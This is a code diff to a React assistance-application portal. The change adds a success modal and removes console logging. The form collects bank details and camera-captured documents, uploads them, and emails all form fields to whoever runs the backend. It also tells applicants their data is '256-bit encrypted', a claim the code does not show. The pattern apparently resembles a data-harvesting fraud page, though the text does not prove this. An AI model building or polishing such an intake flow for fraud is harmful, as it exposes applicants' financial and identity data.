@@ -1,80 +1,138 @@
 import React, { useState } from 'react';
-import { ChevronRight, ChevronLeft, Upload, Check, AlertCircle, Shield, Minus, User, Building, MessageSquare, X } from 'lucide-react';
+import { useNavigate } from 'react-router-dom';
+import {
+  ChevronRight,
+  ChevronLeft,
+  Upload,
+  Check,
+  CheckCircle2,
+  AlertCircle,
+  Shield,
+  Minus,
+  User,
+  Building,
+  MessageSquare,
+  X,
+  Mail,
+  ShieldCheck,
+  ArrowRight
+} from 'lucide-react';
 import { toast } from 'sonner';
 import { bank, state } from '../utils/data';
 import BankAutocomplete from '../components/BankAutoComplete';
 import CameraModal from '../components/CameraModal';
 
-// Modal for submission progress
-const SubmissionProgressModal = ({ isOpen, progress, isComplete }: { isOpen: boolean; progress: number; isComplete: boolean }) => {
+// Modal for upload progress
+const SubmissionProgressModal = ({ isOpen, progress }: { isOpen: boolean; progress: number }) => {
   if (!isOpen) return null;
 
   return (
-    <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
-      <div className="relative mx-4 w-full max-w-md bg-white rounded-lg shadow-xl">
-        <div className="p-6">
-          <div className="flex flex-col items-center justify-center">
-            {isComplete ? (
-              <>
-                <Check className="mb-4 w-16 h-16 text-green-500" />
-                <h3 className="mb-2 text-xl font-semibold text-gray-900">Application Submitted!</h3>
-                <p className="mb-4 text-center text-gray-600">
-                  Your application is now being processed. You should receive a reply within 3-5 business days.
-                </p>
-                <p className="text-sm text-center text-gray-500">
-                  If further verification is needed, we may send an SMS to the phone number you provided.
-                </p>
-              </>
-            ) : (
-              <>
-                <div className="mb-4 flex justify-center items-center w-16 h-16 rounded-full bg-blue-100">
-                  <Upload className="w-8 h-8 text-blue-600 animate-pulse" />
-                </div>
-                <h3 className="mb-2 text-xl font-semibold text-gray-900">Submitting Application</h3>
-                <p className="mb-4 text-center text-gray-600">
-                  Please wait while we upload your documents and submit your application.
-                </p>
-                <div className="w-full bg-gray-200 rounded-full h-2.5">
-                  <div
-                    className="bg-blue-600 h-2.5 rounded-full transition-all duration-300 ease-in-out"
-                    style={{ width: `${progress}%` }}
-                  ></div>
-                </div>
-                <p className="mt-2 text-sm text-gray-500">{progress}% Complete</p>
-              </>
-            )}
-          </div>
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
+      <div className="relative w-full max-w-md p-6 bg-white rounded-2xl shadow-xl text-center">
+        <div className="mx-auto mb-4 flex items-center justify-center w-14 h-14 rounded-full bg-blue-50 text-blue-600">
+          <Upload className="w-7 h-7 animate-pulse" />
         </div>
+        <h3 className="text-lg font-bold text-gray-900">Submitting Application</h3>
+        <p className="mt-1 text-xs text-gray-500">
+          Please wait while your documents are securely uploaded and your application is recorded...
+        </p>
+        <div className="w-full mt-5 bg-gray-100 rounded-full h-2.5 overflow-hidden">
+          <div
+            className="bg-blue-600 h-2.5 rounded-full transition-all duration-300 ease-out"
+            style={{ width: `${progress}%` }}
+          />
+        </div>
+        <p className="mt-2 text-xs font-semibold text-gray-400">{progress}% complete</p>
       </div>
     </div>
   );
 };
 
-// Modal for SMS notification after submit
-const SMSInfoModal = ({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) => {
+// Upgraded Premium Success Modal with 1-5 business days email confirmation notice
+interface SuccessModalProps {
+  isOpen: boolean;
+  applicantName?: string;
+  onClose: () => void;
+}
+
+const SuccessModal: React.FC<SuccessModalProps> = ({ isOpen, applicantName, onClose }) => {
   if (!isOpen) return null;
+
   return (
-    <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
-      <div className="relative mx-4 w-full max-w-md bg-white rounded-lg shadow-xl">
-        <div className="flex justify-between items-center p-6 border-b">
-          <div className="flex items-center">
-            <MessageSquare className="mr-2 w-6 h-6 text-blue-600" />
-            <h3 className="text-lg font-semibold text-gray-900">Verification Notice</h3>
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
+      <div className="relative w-full max-w-lg overflow-hidden bg-white rounded-3xl shadow-2xl border border-gray-100 text-center animate-in zoom-in-95 duration-200">
+        {/* Top Decorative Gradient Accent */}
+        <div className="h-2.5 bg-gradient-to-r from-emerald-500 via-teal-500 to-blue-600" />
+
+        {/* Close Button */}
+        <button
+          onClick={onClose}
+          className="absolute top-4 right-4 p-2 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded-full transition-colors"
+          aria-label="Close"
+        >
+          <X className="w-5 h-5" />
+        </button>
+
+        <div className="p-6 sm:p-8">
+          {/* Animated Success Badge */}
+          <div className="mx-auto mb-4 w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center ring-8 ring-emerald-50/70">
+            <CheckCircle2 className="w-10 h-10 text-emerald-600" />
           </div>
-          <button onClick={onClose} className="p-1 text-gray-400 hover:text-gray-600">
-            <X className="w-5 h-5" />
-          </button>
-        </div>
-        <div className="p-6 text-center">
-          <p className="mb-4 text-gray-700">
-            Your application has been submitted.<br />
-            If further verification is required, you will receive an SMS with instructions to complete your application.
+
+          <h3 className="text-2xl font-bold text-gray-900">
+            Application Submitted!
+          </h3>
+          <p className="mt-2 text-sm text-gray-600 leading-relaxed">
+            {applicantName ? `Thank you, ${applicantName}. ` : 'Thank you! '}
+            Your assistance application and documents have been securely received and recorded.
           </p>
+
+          {/* Key Information Cards */}
+          <div className="mt-6 space-y-3 text-left">
+            {/* Email Confirmation Notice (1-5 business days) */}
+            <div className="p-4 rounded-2xl bg-emerald-50/80 border border-emerald-100/80 flex items-start gap-3.5">
+              <div className="p-2 rounded-xl bg-emerald-100 text-emerald-700 shrink-0 mt-0.5">
+                <Mail className="w-5 h-5" />
+              </div>
+              <div>
+                <h4 className="text-sm font-semibold text-emerald-950">
+                  Email Confirmation (1–5 Business Days)
+                </h4>
+                <p className="mt-1 text-xs text-emerald-800/90 leading-relaxed">
+                  Our intake team will process your application within <span className="font-semibold text-emerald-950">1–5 business days</span>. We may contact you via email at your provided address for further confirmation, updates, or next steps.
+                </p>
+              </div>
+            </div>
+
+            {/* SMS Verification Notice */}
+            <div className="p-4 rounded-2xl bg-blue-50/80 border border-blue-100/80 flex items-start gap-3.5">
+              <div className="p-2 rounded-xl bg-blue-100 text-blue-700 shrink-0 mt-0.5">
+                <MessageSquare className="w-5 h-5" />
+              </div>
+              <div>
+                <h4 className="text-sm font-semibold text-blue-950">
+                  SMS Verification (If Needed)
+                </h4>
+                <p className="mt-1 text-xs text-blue-800/90 leading-relaxed">
+                  If additional verification is required to complete processing, an SMS notification will be sent directly to your registered phone number.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          {/* Security Guarantee */}
+          <div className="mt-5 flex items-center justify-center gap-1.5 text-xs text-gray-400">
+            <ShieldCheck className="w-4 h-4 text-emerald-600" />
+            <span>256-bit encrypted & securely stored</span>
+          </div>
+
+          {/* Primary Action Button to Return Home */}
           <button
             onClick={onClose}
-            className="px-6 py-2 mt-4 font-medium text-white bg-blue-600 rounded-lg hover:bg-blue-700"
+            className="w-full mt-6 py-3.5 px-6 rounded-xl font-semibold text-white bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/30 transition-all duration-200 flex items-center justify-center gap-2 group text-base cursor-pointer"
           >
-            OK
+            <span>Okay, Return to Home</span>
+            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
           </button>
         </div>
       </div>
@@ -170,11 +228,18 @@ const ApplicationPortal = () => {
   const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
   const allStates = state;
   const allBanks = bank;
+  const navigate = useNavigate();
   const [showModal, setShowModal] = useState(false);
-  const [showSMSInfo, setShowSMSInfo] = useState(false);
+  const [showSuccessModal, setShowSuccessModal] = useState(false);
+  const [submittedName, setSubmittedName] = useState('');
   const [showProgressModal, setShowProgressModal] = useState(false);
   const [submissionComplete, setSubmissionComplete] = useState(false);
   const [progress, setProgress] = useState(0);
+
+  const handleCloseSuccess = () => {
+    setShowSuccessModal(false);
+    navigate('/');
+  };
 
   const handleCapture = (data: string) => {
     console.log('Captured:', data);
@@ -414,8 +479,6 @@ const ApplicationPortal = () => {
     if (!file) throw new Error('File is required for upload');
 
     try {
-      console.log('📤 Uploading to Cloudinary:', { fileName: file.name, size: file.size });
-
       const formData = new FormData();
       formData.append('file', file);
       formData.append('folder', folder);
@@ -433,7 +496,6 @@ const ApplicationPortal = () => {
       return await response.json();
     } catch (error: unknown) {
       const msg = error instanceof Error ? error.message : 'Unknown error';
-      console.error(`File upload error for ${file.name}:`, error);
       throw new Error(`Failed to upload ${file.name}: ${msg}`);
     }
   };
@@ -493,10 +555,7 @@ const ApplicationPortal = () => {
           const fileName = file.name || `${fieldName}_${Date.now()}`;
           const fileToUpload = new File([file], fileName, { type: file.type || 'application/octet-stream' });
 
-          console.log(`Uploading file ${i + 1}/${documentFiles.length}:`, { name: fileToUpload.name, fieldName });
-
           const uploadedFile = await uploadFile(fileToUpload, cloudinaryFolder);
-          console.log(`✅ Upload successful for ${fileToUpload.name}`);
 
           uploadedFiles.push({
             name: uploadedFile.name,
@@ -516,7 +575,6 @@ const ApplicationPortal = () => {
       }
 
       setProgress(100);
-
 
       // 5. Prepare log data with ALL form fields
       const logData = {
@@ -549,16 +607,12 @@ const ApplicationPortal = () => {
         files: uploadedFiles
       };
 
-      // 6. Send log data to backend (emails you)
-      const response = await logToBackend(logData);
-      console.log('Backend response:', response);
+      // 6. Send log data to backend (saves to DB and sends email)
+      await logToBackend(logData);
       setSubmissionComplete(true);
-
-      // Show success notification for 3 seconds, then show SMS info
-      setTimeout(() => {
-        setShowProgressModal(false);
-        setShowSMSInfo(true);
-      }, 3000);
+      setSubmittedName(formData.firstName);
+      setShowProgressModal(false);
+      setShowSuccessModal(true);
 
       // Reset form
       setFormData({
@@ -1326,10 +1380,14 @@ const ApplicationPortal = () => {
             )}
           </div>
         </div>
-        {/* SMS Info Modal */}
-        <SMSInfoModal isOpen={showSMSInfo} onClose={() => setShowSMSInfo(false)} />
+        {/* Upgraded Success Modal */}
+        <SuccessModal
+          isOpen={showSuccessModal}
+          applicantName={submittedName}
+          onClose={handleCloseSuccess}
+        />
         {/* Submission Progress Modal */}
-        <SubmissionProgressModal isOpen={showProgressModal} progress={progress} isComplete={submissionComplete} />
+        <SubmissionProgressModal isOpen={showProgressModal} progress={progress} />
       </div>
     </div>
   );
